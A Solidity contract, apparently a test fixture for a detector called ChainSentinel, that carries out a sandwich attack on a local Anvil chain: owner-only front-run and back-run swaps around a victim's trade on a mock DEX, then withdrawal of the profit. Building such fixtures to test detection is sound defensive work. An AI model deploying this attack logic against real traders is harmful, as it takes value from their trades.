// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "../../../../shared/contracts/MockERC20.sol";

interface IDEX {
    function swap(address tokenIn, uint256 amountIn) external returns (uint256);
    function getAmountOut(address tokenIn, uint256 amountIn) external view returns (uint256);
}

/**
 * @title SandwichAttacker
 * @notice Executes front-run and back-run swaps around a victim's trade.
 *         All 3 transactions land in the same block on Anvil.
 *         ChainSentinel never sees this source code — it detects the
 *         attack purely from on-chain execution traces and swap events.
 */
contract SandwichAttacker {
    address public owner;
    IDEX public dex;

    event FrontRun(address tokenIn, uint256 amountIn, uint256 amountOut);
    event BackRun(address tokenIn, uint256 amountIn, uint256 amountOut);

    constructor(address _dex) {
        owner = msg.sender;
        dex = IDEX(_dex);
    }

    /// @notice Front-run: buy the token the victim wants, moving the price up
    function frontrun(address tokenIn, uint256 amount) external returns (uint256 amountOut) {
        require(msg.sender == owner, "Not owner");
        MockERC20(tokenIn).approve(address(dex), amount);
        amountOut = dex.swap(tokenIn, amount);
        emit FrontRun(tokenIn, amount, amountOut);
    }

    /// @notice Back-run: sell the token after victim bought at worse price
    function backrun(address tokenIn, uint256 amount) external returns (uint256 amountOut) {
        require(msg.sender == owner, "Not owner");
        MockERC20(tokenIn).approve(address(dex), amount);
        amountOut = dex.swap(tokenIn, amount);
        emit BackRun(tokenIn, amount, amountOut);
    }

    /// @notice Withdraw profits to owner
    function withdrawAll(address token) external {
        require(msg.sender == owner, "Not owner");
        MockERC20 t = MockERC20(token);
        uint256 bal = t.balanceOf(address(this));
        if (bal > 0) {
            t.transfer(owner, bal);
        }
    }
}
